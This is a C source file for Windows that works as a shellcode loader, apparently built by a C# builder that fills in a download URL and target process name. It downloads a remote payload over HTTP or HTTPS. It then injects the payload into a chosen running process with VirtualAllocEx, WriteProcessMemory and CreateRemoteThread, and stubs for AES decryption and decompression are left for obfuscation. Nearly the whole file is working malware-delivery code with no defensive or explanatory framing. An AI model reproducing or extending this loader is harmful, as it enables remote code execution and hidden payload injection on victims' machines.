#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <tlhelp32.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ssl.lib")
#pragma comment(lib, "crypto.lib")

#define PAYLOAD_SIZE 1024*1024  // 1MB buffer
#define AES_KEY_SIZE 32
#define AES_IV_SIZE 16

// Function declarations
void DownloadData(const char* url, unsigned char** data, int* dataSize);
void DecryptData(unsigned char* data, int dataSize, unsigned char* decrypted, int* decryptedSize);
void DecompressData(unsigned char* data, int dataSize, unsigned char* decompressed, int* decompressedSize);
void InjectPayload(unsigned char* payload, int payloadSize, const char* targetProcess);

// Global variables
unsigned char* downloadedData = NULL;
int downloadedSize = 0;

int main() {
	// These will be replaced by C# program
	const char* url = "$SHELLCODE_URL$";
	const char* targetProcess = "$TARGET_PROCESS$";
	
	// Download the data
	DownloadData(url, &downloadedData, &downloadedSize);
	if (downloadedSize == 0) {
		printf("Failed to download data\n");
		return 1;
	}

	// Display first 64 bytes of downloaded data
	printf("First 64 bytes (hex): ");
	for (int i = 0; i < 64 && i < downloadedSize; i++) {
		printf("%02X", downloadedData[i]);
	}
	printf("\n");

	printf("First 64 bytes (text): ");
	for (int i = 0; i < 64 && i < downloadedSize; i++) {
		printf("%c", downloadedData[i]);
	}
	printf("\n");

	// Inject and execute the payload
	InjectPayload(downloadedData, downloadedSize, targetProcess);

	// Cleanup
	if (downloadedData) {
		free(downloadedData);
	}

	return 0;
}

// Function to download data from URL
void DownloadData(const char* url, unsigned char** data, int* dataSize) {
	WSADATA wsa;
	SOCKET s;
	struct addrinfo hints, *result = NULL;
	char hostname[256];
	char path[1024];
	int port = 80;  // Default HTTP port
	SSL_CTX* ctx = NULL;
	SSL* ssl = NULL;
	
	// Initialize data pointer to NULL
	*data = NULL;
	*dataSize = 0;
	
	// Parse URL to get protocol, hostname and path
	if (strncmp(url, "https://", 8) == 0) { //strncmp compares the first 8 characters of the url to "https://", if they are equal, it returns 0
		port = 443;  // Default HTTPS port
		if (sscanf(url + 8, "%[^/]%s", hostname, path) != 2) { //sscanf reads the url from the 8th character onwards, and stores the hostname and path in the hostname and path variables
			printf("Invalid HTTPS URL format\n");
			return;
		}
	}
	else if (strncmp(url, "http://", 7) == 0) { //strncmp compares the first 7 characters of the url to "http://", if they are equal, it returns 0
		if (sscanf(url + 7, "%[^/]%s", hostname, path) != 2) { //sscanf reads the url from the 7th character onwards, and stores the hostname and path in the hostname and path variables
			printf("Invalid HTTP URL format\n");
			return;
		}
	}
	else {
		printf("URL must start with http:// or https://\n");
		return;
	}
	
	char* port_str = strchr(hostname, ':'); //strchr returns a pointer to the first occurrence of a colon the string, if not found, returns NULL
	if (port_str) {
		*port_str = '\0';
		port = atoi(port_str + 1); //atoi converts the string to an integer, port_str + 1 is the pointer to the first character after the colon
	}

	// Initialize Winsock
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) { //MAKEWORD(2, 2) is the version of the Winsock API to use, &wsa is a pointer to the WSADATA structure to receive the version information
		printf("Error initializing Winsock\n");
		return;
	}

	// Initialize OpenSSL
	SSL_library_init();
	OpenSSL_add_all_algorithms();
	SSL_load_error_strings();

	// Setup hints structure
	ZeroMemory(&hints, sizeof(hints)); //ZeroMemory sets all the bytes in the hints structure to 0
	hints.ai_family = AF_INET; //AF_INET is the address family for IPv4
	hints.ai_socktype = SOCK_STREAM; //SOCK_STREAM is the socket type for TCP
	hints.ai_protocol = IPPROTO_TCP; //IPPROTO_TCP is the protocol for TCP

	// Resolve hostname
	if (getaddrinfo(hostname, NULL, &hints, &result) != 0) { //getaddrinfo resolves the hostname to an IP address, NULL is the service name/port number, &hints is what type of address to resolve, &result is the result of the resolution
		WSACleanup();
		return;
	}

	// Create socket
	if ((s = socket(result->ai_family, result->ai_socktype, result->ai_protocol)) == INVALID_SOCKET) { //self explanatory
		printf("Could not create socket\n");
		freeaddrinfo(result);
		WSACleanup();
		return;
	}

	// Connect to server
	struct sockaddr_in* addr = (struct sockaddr_in*)result->ai_addr; //setting the address to the result of the resolution
	addr->sin_port = htons(port); //htons converts the port number to a network byte order
	
	if (connect(s, (struct sockaddr*)addr, sizeof(struct sockaddr_in)) == SOCKET_ERROR) { //connect connects the socket to the server using the address, port, an
		printf("Connection failed\n");
		closesocket(s);
		freeaddrinfo(result);
		WSACleanup();
		return;
	}

	// Setup SSL if using HTTPS
	if (port == 443) {
		ctx = SSL_CTX_new(TLS_client_method());
		if (!ctx) {
			printf("SSL context creation failed\n");
			goto cleanup;
		}

		ssl = SSL_new(ctx);
		if (!ssl) {
			printf("SSL creation failed\n");
			goto cleanup;
		}

		SSL_set_fd(ssl, s);
		SSL_set_tlsext_host_name(ssl, hostname);

		if (SSL_connect(ssl) != 1) {
			printf("SSL connection failed\n");
			goto cleanup;
		}
	}

	// Prepare HTTP request
	char request[2048];
	sprintf(request, "GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, hostname); //sprintf formats the request string, %s is a placeholder for the path and hostname respectively

	// Send HTTP request
	if (port == 443) {
		if (SSL_write(ssl, request, strlen(request)) <= 0) {
			printf("SSL send failed\n");
			goto cleanup;
		}
	} else {
		if (send(s, request, strlen(request), 0) == SOCKET_ERROR) { 
			printf("Send failed\n");
			goto cleanup;
		}
	}

	// Read data
	int totalBytesRead = 0;
	char buffer[1024];
	int bytesRead;
	unsigned char* tempData = NULL;
	int tempSize = 0;

	// Read data
	while (1) {
		if (port == 443) {
			bytesRead = SSL_read(ssl, buffer, sizeof(buffer));
			if (bytesRead <= 0) {
				int err = SSL_get_error(ssl, bytesRead);
				if (err == SSL_ERROR_NONE || err == SSL_ERROR_ZERO_RETURN) {
					break;
				}
				printf("SSL read failed\n");
				goto cleanup;
			}
		} else {
			bytesRead = recv(s, buffer, sizeof(buffer), 0);
			if (bytesRead <= 0) break;
		}

		if (totalBytesRead == 0) {
			// First chunk - look for headers
			char* body = strstr(buffer, "\r\n\r\n"); //searches for two newlines in the buffer, indicating the end of the header
			if (body) {
				body += 4;  // Skip \r\n\r\n
				int bodyLength = bytesRead - (body - buffer);
				if (bodyLength > 0) {
					tempSize = bodyLength;
					tempData = (unsigned char*)malloc(tempSize);
					if (!tempData) {
						printf("Memory allocation failed\n");
						goto cleanup;
					}
					memcpy(tempData, body, bodyLength);
					totalBytesRead = bodyLength;
				}
			}
		} else {
			// Subsequent chunks - reallocate and append
			unsigned char* newData = (unsigned char*)realloc(tempData, tempSize + bytesRead);
			if (!newData) {
				printf("Memory reallocation failed\n");
				free(tempData);
				goto cleanup;
			}
			tempData = newData;
			memcpy(tempData + tempSize, buffer, bytesRead);
			tempSize += bytesRead;
			totalBytesRead = tempSize;
		}
	}

	*data = tempData;
	*dataSize = totalBytesRead;

cleanup:
	// Cleanup
	if (ssl) {
		SSL_free(ssl);
	}
	if (ctx) {
		SSL_CTX_free(ctx);
	}
	closesocket(s);
	freeaddrinfo(result);
	WSACleanup();
	ERR_free_strings();
	EVP_cleanup();
}

void DecryptData(unsigned char* data, int dataSize, unsigned char* decrypted, int* decryptedSize) {
	// TODO: Implement AES-256-CBC decryption
}

void DecompressData(unsigned char* data, int dataSize, unsigned char* decompressed, int* decompressedSize) {
	// TODO: Implement deflate9 decompression
}

void InjectPayload(unsigned char* payload, int payloadSize, const char* targetProcess) {
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	LPVOID pRemoteBuffer = NULL;
	DWORD processId = 0;
	HANDLE hSnapshot = NULL;
	PROCESSENTRY32 pe32 = { 0 };

	// Take a snapshot of all processes
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); //TH32CS_SNAPPROCESS = snapshot of all processes
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		printf("CreateToolhelp32Snapshot failed\n");
		return;
	}

	// Set the size of the structure before using it
	pe32.dwSize = sizeof(PROCESSENTRY32); 

	// Get the first process
	if (!Process32First(hSnapshot, &pe32)) { //Process32First gets the first process in the snapshot
		printf("Process32First failed\n");
		CloseHandle(hSnapshot);
		return;
	}

	// Find the target process
	do {
		if (_stricmp(pe32.szExeFile, targetProcess) == 0) { //_stricmp compares the snapshot process name to the target process name
			processId = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hSnapshot, &pe32)); // If not the correct process, Process32Next gets the next process in the snapshot

	CloseHandle(hSnapshot);

	if (processId == 0) {
		printf("Target process not found\n");
		return;
	}

	// Open the target process
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
	if (hProcess == NULL) {
		printf("OpenProcess failed\n");
		return;
	}

	// Allocate memory in the target process
	pRemoteBuffer = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pRemoteBuffer == NULL) {
		printf("VirtualAllocEx failed\n");
		CloseHandle(hProcess);
		return;
	}

	// Write the payload to the allocated memory
	SIZE_T bytesWritten;
	if (!WriteProcessMemory(hProcess, pRemoteBuffer, payload, payloadSize, &bytesWritten)) {
		printf("WriteProcessMemory failed\n");
		VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return;
	}

	// Create a remote thread to execute the payload
	DWORD threadId;
	hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteBuffer, NULL, 0, &threadId);
	if (hThread == NULL) {
		printf("CreateRemoteThread failed\n");
		VirtualFreeEx(hProcess, pRemoteBuffer, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return;
	}

	printf("Injection complete.\n");

	// Cleanup
	CloseHandle(hThread);
	CloseHandle(hProcess);
}